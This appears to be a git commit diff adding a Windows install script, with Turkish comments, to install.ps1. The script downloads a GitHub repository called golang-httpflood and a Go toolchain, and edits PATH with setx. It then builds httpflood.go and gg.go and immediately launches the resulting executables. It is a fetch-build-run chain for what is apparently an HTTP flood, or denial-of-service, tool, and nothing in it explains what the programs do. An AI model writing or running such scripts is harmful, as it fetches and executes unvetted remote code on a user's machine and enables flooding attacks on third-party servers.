c00825fcbf87e552a45f9517da38437e4118c192
murmurlab <0aeon0@mail.com>
2024-10-29 01:46:36 +0000

    t

--- install.ps1
+++ install.ps1
@@ -1,4 +1,40 @@
 @echo off
+echo == GitHub reposunu indiriliyor... ==
+REM PowerShell kullanarak repositoriyi indir
+powershell -Command "Invoke-WebRequest -Uri https://github.com/murmurlab/golang-httpflood/archive/refs/heads/main.zip -OutFile $env:USERPROFILE\flo.zip"
+
+echo == İndirilen repo çıkarılıyor... ==
+REM Dosyayı hedef dizine çıkar
+powershell -Command "Expand-Archive -Path $env:USERPROFILE\flo.zip -DestinationPath $env:USERPROFILE\flo"
+
+echo == Go dilini indiriliyor... ==
+REM Go'yu indir
+powershell -Command "Invoke-WebRequest -Uri https://go.dev/dl/go1.19.4.windows-amd64.zip -OutFile $env:USERPROFILE\gol.zip"
+
+echo == Go dil dosyaları çıkarılıyor... ==
+REM Go'yu çıkar
+powershell -Command "Expand-Archive -Path $env:USERPROFILE\gol.zip -DestinationPath $env:USERPROFILE"
+
+echo == Go binary yolu ayarlanıyor... ==
+REM Go binary yolunu ayarla
+setx GOPATH "%USERPROFILE%\go"
+setx PATH "%PATH%;%USERPROFILE%\go\bin"
+
+echo == Go dosyaları derleniyor... ==
+REM Go dosyalarını derle
+powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\httpflood.go"
+powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\gg.go"
+
+echo == Çıktılar çalıştırılıyor... ==
+REM Çıktıları çalıştır
+powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\httpflood.exe"
+powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\gg.exe"
+
+echo == İşlem tamamlandı! ==
+pause
+
+
+@echo off
 REM PowerShell kullanarak repositoriyi indir
 powershell -Command "Invoke-WebRequest -Uri https://github.com/murmurlab/golang-httpflood/archive/refs/heads/main.zip -OutFile %USERPROFILE%\flo.zip"
 
@@ -22,3 +58,4 @@ REM Go dosyalarını derle
 REM Çıktıları çalıştır
 %USERPROFILE%\flo\golang-httpflood-main\httpflood.exe
 %USERPROFILE%\flo\golang-httpflood-main\gg.exe
+
